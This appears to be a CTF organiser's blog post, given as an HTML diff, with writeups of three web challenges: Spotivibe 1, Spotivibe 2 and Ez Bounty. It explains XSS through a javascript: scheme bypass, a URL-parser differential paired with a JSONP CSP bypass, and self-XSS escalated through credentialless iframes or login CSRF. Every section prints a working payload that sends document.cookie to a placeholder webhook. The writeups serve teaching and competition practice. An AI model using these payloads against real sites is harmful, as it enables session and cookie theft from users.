@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="UTF-8">
+  <title>Writeups of my challenges at K!nd4SUS CTF 2026</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+
+  
+  <link rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets@11.9.0/styles/github-dark.min.css">
+
+  
+  <link rel="stylesheet" href="../../static/css/common.css">
+
+ 
+  <link rel="stylesheet" href="../../static/css/pages.css">
+</head>
+
+<body>
+  <header>
+    <nav class="main-nav">
+      <ul>
+        <li><a href="../../index.html">Home</a></li>
+        <li><a href="../posts-page-1.html" aria-current="page">Blog</a></li>
+        <li><a href="../../cv.pdf">CV</a></li>
+      </ul>
+    </nav>
+  </header>
+  
+  
+  <main class="post-wrapper">
+    <h1 class="post-title">Writeups of my challenges at K!nd4SUS CTF 2026</h1>
+    <div class="post-meta">
+      <span><i class="fa-regular fa-calendar"></i>April 19, 2026</span>
+      
+    </div>
+
+    <figure>
+      <img src="../../static/images/K!nd4.png" alt="SAS CTF banner" style="width: 9rem; height: auto;">
+    </figure>
+    <article class="post-content">
+    <p>Last week, I had the opportunity to organize, together with the other K!nd4SUS members, the second edition of the <code>K!nd4SUS CTF</code>, where I contributed by creating three Web challenges: <code>Spotivibe 1</code>, <code>Spotivibe 2</code>, and <code>Ez Bounty</code>.</p>
+<p>Below you can find the writeups for these challenges.</p>
+     <h2>SpotiVibe 1</h2>
+<hr>
+
+<p>The application allows users to create custom song pages by embedding Spotify tracks.</p>
+
+<p>There is also a feature that allows a user to report a song to an admin bot. The bot visits the reported page and its cookie contains the flag which immediately suggests that the challenge is <strong>XSS-related</strong>.</p>
+
+<pre><code class="language-python">await page.setCookie({
+    "name": "flag",
+    "value": FLAG,
+    "path": "/",
+    "httpOnly": False
+})
+</code></pre>
+
+
+<pre><code class="language-python">threading.Thread(target=run_bot, args=(song_id,)).start()
+</code></pre>
+
+<p>The vulnerable page is generated using user input when creating a song. The relevant part is the <code>&lt;iframe&gt;</code> that loads the provided Spotify URL:</p>
+
+<pre><code class="language-html">&lt;iframe 
+    src="{{ song.spotify_url}}"
+    width="400"
+    height="380"
+    frameborder="0"
+    allowtransparency="true"
+    allow="encrypted-media"&gt;
+&lt;/iframe&gt;
+</code></pre>
+
+<p>The application performs validation on the URL, requiring:</p>
+<ul>
+<li>The hostname to be <code>open.spotify.com</code></li>
+<li>The path to start with <code>/embed/</code></li>
+<li>No double quotes in the URL</li>
+</ul>
+
+<pre><code class="language-python">if parsed.hostname != "open.spotify.com":
+    return False
+
+if not parsed.path.startswith("/embed/"):
+    return False
+
+if '"' in decoded:
+    return False
+</code></pre>
+
+<p>At first glance, the validation seems reasonably secure, as it enforces both the hostname and the path of the provided URL. However, it completely lacks any control over the URL scheme (protocol), which makes it possible to bypass these checks.</p>
+
+<p>In particular, this allows us to use the <code>javascript:</code> protocol instead of a standard <code>https://</code> URL. When parsing a payload such as <code>javascript://open.spotify.com/embed/...</code>, Python’s <code>urlparse</code> interprets <code>javascript</code> as the scheme, <code>open.spotify.com</code> as the hostname, and <code>/embed/...</code> as the path.</p>
+
+
+<p>The final payload used to solve the challenge is:</p>
+
+<pre><code class="language-text">javascript://open.spotify.com/embed/%0afetch('https://webhook/?c='+document.cookie)
+</code></pre>
+
+<p>Here, <code>//</code> starts a JavaScript comment, effectively ignoring <code>open.spotify.com/embed/</code>, while the newline (<code>%0a</code>) breaks the comment and allows the malicious code to execute. </p>
+
+<h2>SpotiVibe 2</h2>
+<hr>
+
+<p>In this second version of the challenge, an additional validation has been introduced to mitigate the previous vulnerability.</p>
+
+<p>In particular, the application now enforces that the scheme must be either <code>http</code> or <code>https</code>:</p>
+
+<pre><code class="language-python">if parsed.scheme not in ["http", "https"]:
+    return False
+</code></pre>
+
+<p>This prevents the use of the <code>javascript:</code> protocol, making the previous exploit no longer viable.</p>
+
+<p>As in the previous challenge, the flag is stored inside a cookie of the admin bot:</p>
+
+<pre><code class="language-python">await page.setCookie({
+    "name": "flag",
+    "value": FLAG,
+    "path": "/",
+    "httpOnly": False
+})
+</code></pre>
+
+<p>A new feature has also been introduced: a search functionality on the <code>/dashboard</code> page. The <code>search</code> parameter is directly rendered using the <code>| safe</code> filter:</p>
+
+<pre><code class="language-html">&lt;p&gt;Results for: &lt;strong&gt;{{ search | safe }}&lt;/strong&gt;&lt;/p&gt;
+</code></pre>
+
+<p>This introduces a clear <strong>XSS vulnerability</strong> on the <code>search</code> parameter.</p>
+
+<p>However, this injection point alone is not sufficient due to the presence of a Content Security Policy (CSP), which blocks inline scripts and only allows scripts with a valid nonce or from specific trusted sources:</p>
+
+<pre><code class="language-text">script-src 'self' 'nonce-...' https://www.w3schools.com;
+</code></pre>
+
+<p>To exploit the vulnerability, it is necessary to chain multiple issues together.</p>
+
+<p>First, we bypass the URL validation by exploiting a discrepancy between how Python’s <code>urlparse</code> (which follows <strong>RFC 3986</strong>) and modern browsers (which follow the <strong>WHATWG URL Standard</strong>) interpret URLs.</p>
+
+<p>According to RFC 3986, the <code>\</code> character has no special meaning and is treated as a normal character. Therefore, when parsing a URL such as:</p>
+
+<pre><code class="language-text">http://chall.k1nd4sus.it:30503\@open.spotify.com/embed/../../dashboard?search=</code></pre>
+
+<p>Python interprets it as:</p>
+<ul>
+<li><strong>scheme:</strong> <code>http</code></li>
+<li><strong>userinfo:</strong> <code>chall.k1nd4sus.it:30503\</code></li>
+<li><strong>hostname:</strong> <code>open.spotify.com</code></li>
+<li><strong>path:</strong> <code>/embed/...</code></li>
+</ul>
+
+<p>The <code>@</code> symbol plays a crucial role here: in URLs, it separates the optional <em>userinfo</em> (username:password) from the hostname. Everything before <code>@</code> is treated as user-controlled metadata, while everything after it is considered the actual host.</p>
+
+<p>Because of this, the validation logic sees <code>open.spotify.com</code> as the hostname and accepts the URL.</p>
+
+<p>However, browsers follow the WHATWG URL Standard, which normalizes backslashes (<code>\</code>) into forward slashes (<code>/</code>) before parsing. As a result, the same URL is interpreted by the browser as:</p>
+
+<pre><code class="language-text">http://chall.k1nd4sus.it:30503/@open.spotify.com/embed/../../dashboard?search=</code></pre>
+
+<p>Now the hostname becomes <code>chall.k1nd4sus.it</code>, and <code>@open.spotify.com</code> is treated as part of the path rather than userinfo.</p>
+
+
+<p>Finally, the <code>../../</code> sequence performs a <strong>path traversal</strong>, allowing navigation from <code>/embed/</code> to <code>/dashboard</code>, where the XSS vulnerability is located.</p>
+
+<p>At this point, we control the <code>search</code> parameter, but CSP still prevents direct execution of inline JavaScript.</p>
+
+<p>However, the CSP explicitly allows scripts from <code>https://www.w3schools.com</code>. This can be abused using a <strong>JSONP endpoint</strong>.</p>
+
+<p>JSONP (JSON with Padding) is a legacy technique where the server returns JavaScript instead of plain JSON, wrapping the response inside a user-controlled <code>callback</code> function. Since the callback is directly executed by the browser, controlling it allows arbitrary JavaScript execution.</p>
+
+<p>The endpoint <code>https://www.w3schools.com/js/demo_jsonp2.php</code> reflects the <code>callback</code> parameter without sanitization, making it usable for a CSP bypass.</p>
+
+<p>The final exploit is the following</p>
+
+<pre><code class="language-text">http://chall.k1nd4sus.it:30503\@open.spotify.com/embed/../../dashboard?search=&lt;script+src=&#39;https://www.w3schools.com/js/demo_jsonp2.php?callback=setTimeout(function(){new Image().src=&#39;WEBHOOK_URL?d=&#39;+document.cookie},0)&#39;&gt;&lt;/script&gt;</code></pre>
+
+
+<h2>Ez Bounty</h2>
+<hr>
+
+<p>The goal of this challenge is to steal the flag stored inside the admin bot’s cookie.</p>
+
+<p>The application exposes a <code>/report</code> endpoint that allows us to make the admin bot visit an arbitrary URL.</p>
+
+<pre><code class="language-python">await page.setCookie({
+    "name": "flag",
+    "value": FLAG,
+    "httpOnly": False,
+    "sameSite": "None",
+    "secure": True
+})
+</code></pre>
+
+<p>Additionally, the dashboard renders the username using the <code>| safe</code> filter:</p>
+
+<pre><code class="language-html">&lt;h1&gt;Welcome &lt;span class="username"&gt;{{ username | safe }}&lt;/span&gt;&lt;/h1&gt;
+</code></pre>
+
+<p>This introduces a <strong>stored self-XSS</strong>, since the payload is only executed when the user is logged into their own account.</p>
+
+<h3>Intended Solution — Credentialless iframe abuse</h3>
+
+<p>At first glance, the self-XSS seems useless, since triggering it would require the bot to log into our account, losing access to the admin session and its cookie.</p>
+
+<p>However, this limitation can be bypassed using <strong>credentialless iframes</strong>.</p>
+
+<p>A <code>credentialless</code> iframe loads a page without sending cookies, creating a fresh session. At the same time, it still shares the same origin with other frames, allowing interaction via <code>window.top</code>.</p>
+
+<ul>
+<li>we can log into our account inside a credentialless iframe (triggering our self-XSS)</li>
+<li>at the same time, another iframe on the page can remain logged in as admin</li>
+<li>since both frames are same-origin, our JavaScript can access the admin iframe</li>
+</ul>
+
+<p>To make the payload cleaner, instead of placing all the JavaScript inside the username, we use the following payload:</p>
+
+<pre><code class="language-html">&lt;img src=x onerror=eval(window.name)&gt;
+</code></pre>
+
+<p>This allows us to store the actual JavaScript inside the iframe <code>name</code> attribute and execute it via <code>eval(window.name)</code>.</p>
+
+<p>When the XSS triggers, the injected script:</p>
+
+<ul>
+<li>scans all frames using <code>window.top.frames</code></li>
+<li>locates the iframe containing <code>/dashboard</code></li>
+<li>accesses <code>document.cookie</code> from that frame</li>
+<li>exfiltrates the cookie to our webhook</li>
+</ul>
+
+<p>The final exploit page is:</p>
+
+<pre><code class="language-html">&lt;div style="display:flex; gap:20px;"&gt;
+
+  &lt;iframe
+    name="
+let i = setInterval(() => {
+  try {
+    for (let j = 0; j &lt; window.top.frames.length; j++) {
+      let f = window.top.frames[j];
+      try {
+        if (f.location.href.includes('dashboard')) {
+          if (f.document &amp;&amp; f.document.body &amp;&amp; f.document.readyState === 'complete') {
+            new Image().src =
+              'https://WEBHOOK_URL?c=' +
+              encodeURIComponent(f.document.cookie);
+            clearInterval(i);
+          }
+        }
+      } catch(e) {}
+    }
+  } catch(e) {}
+}, 500);
+"
+    width="40%"
+    height="500"
+    credentialless&gt;
+  &lt;/iframe&gt;
+
+  &lt;script&gt;
+document.querySelector("iframe").srcdoc = `
+&lt;form action="https://chall.k1nd4sus.it:30510/login" method="POST"&gt;
+  &lt;input name="username" value="&lt;img src=x onerror=eval(window.name)&gt;" /&gt;
+  &lt;input name="password" value="PASSWORD" /&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;\/script&gt;
+`;
+&lt;/script&gt;
+
+  &lt;iframe
+    src="https://chall.k1nd4sus.it:30510/dashboard"
+    width="40%"
+    height="500"&gt;
+  &lt;/iframe&gt;
+
+&lt;/div&gt;
+</code></pre>
+
+<p>For a more in-depth explanation of this technique, see: 
+<a href="https://blog.slonser.info/posts/make-self-xss-great-again/">https://blog.slonser.info/posts/make-self-xss-great-again/</a>
+</p>
+
+<h3>Unintended Solution</h3>
+
+<p>An unintended solution consists of chaining the self-XSS with a lack of CSRF protection on the authentication endpoints.</p>
+
+<p>The idea is to force the bot to log into our malicious account instead of the admin one.</p>
+
+<p>This is possible because both <code>/login</code> and <code>/logout</code> do not implement CSRF protections.</p>
+
+<p>We register a user with a malicious username such as:</p>
+
+<pre><code class="language-html">&lt;script&gt;fetch('https://WEBHOOK_URL?c='+document.cookie)&lt;/script&gt;
+</code></pre>
+
+<p>Then we host a page that:</p>
+
+<ul>
+<li>logs the bot out using a cross-origin request</li>
+<li>auto-submits a login form with our credentials</li>
+</ul>
+
+<pre><code class="language-html">&lt;form method="POST" action="https://chall.k1nd4sus.it:30510/login"&gt;
+  &lt;input name="username" value="&amp;lt;script&amp;gt;fetch('https://WEBHOOK_URL?c='+document.cookie)&amp;lt;/script&amp;gt;"&gt;
+  &lt;input name="password" value="password"&gt;
+&lt;/form&gt;
+
+&lt;script&gt;
+fetch("https://chall.k1nd4sus.it:30510/logout", {
+  credentials: "include",
+  mode: "no-cors"
+}).then(() =&gt; document.forms[0].submit());
+&lt;/script&gt;
+</code></pre>
+
+<p>When the bot visits this page:</p>
+
+<ul>
+<li>it logs out of the admin account</li>
+<li>it logs into our malicious account</li>
+<li>it is redirected to <code>/dashboard</code></li>
+<li>our stored XSS executes</li>
+<li><code>document.cookie</code> (including the flag) is exfiltrated</li>
+</ul>
+
+<p>This works because <code>session.clear()</code> only removes the server-side session data and the associated session cookie, but it does not affect other cookies set in the browser.</p>
+
+<p>In particular, the flag is stored in a separate cookie that is manually set by the bot using <code>page.setCookie()</code>. This cookie is not tied to the Flask session and is therefore not removed during the logout process.</p>
+
+<p>As a result, even after the forced logout and subsequent login into our account, the flag cookie is still present in the browser.</p>
+
+
+    </article>
+</main>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+	<script>hljs.highlightAll();</script>
+</body>
+</html>
